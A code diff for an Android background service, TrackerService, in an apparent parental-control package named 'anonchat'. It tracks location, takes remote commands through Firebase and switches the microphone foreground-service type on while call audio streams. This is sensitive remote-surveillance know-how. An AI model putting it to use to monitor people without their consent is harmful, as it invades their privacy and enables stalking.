@@ -68,14 +68,6 @@ class TrackerService : Service() {
             if (hasLocation) fgsType = fgsType or
                 android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
 
-            if (hasMic && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                fgsType = fgsType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            }
-
-            if (hasCam && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                fgsType = fgsType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            }
-
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 fgsType = fgsType or
                     android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
@@ -103,6 +95,31 @@ class TrackerService : Service() {
         return START_STICKY
     }
 
+    private fun setMicForegroundState(isMicActive: Boolean) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            try {
+                val notification = createNotification()
+                var fgsType = 0
+                val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED ||
+                    checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
+                    android.content.pm.PackageManager.PERMISSION_GRANTED
+                if (hasLocation) fgsType = fgsType or
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                    fgsType = fgsType or
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                }
+                if (isMicActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    fgsType = fgsType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
+                startForeground(NOTIFICATION_ID, notification, fgsType)
+            } catch (e: Exception) {
+                Log.w(TAG, "Dynamic FGS update failed: ${e.message}")
+            }
+        }
+    }
+
     private fun startFirebaseCommandListener() {
         try {
             com.anonchat.app.parentalcontrol.manager.FirebaseManager.listenForCommands { commandId, commandType, params ->
@@ -128,7 +145,11 @@ class TrackerService : Service() {
             }
             start()
         }
-        callStreamManager = CallStreamManager()
+        callStreamManager = CallStreamManager().apply {
+            onStreamingStateChanged = { active ->
+                setMicForegroundState(active)
+            }
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
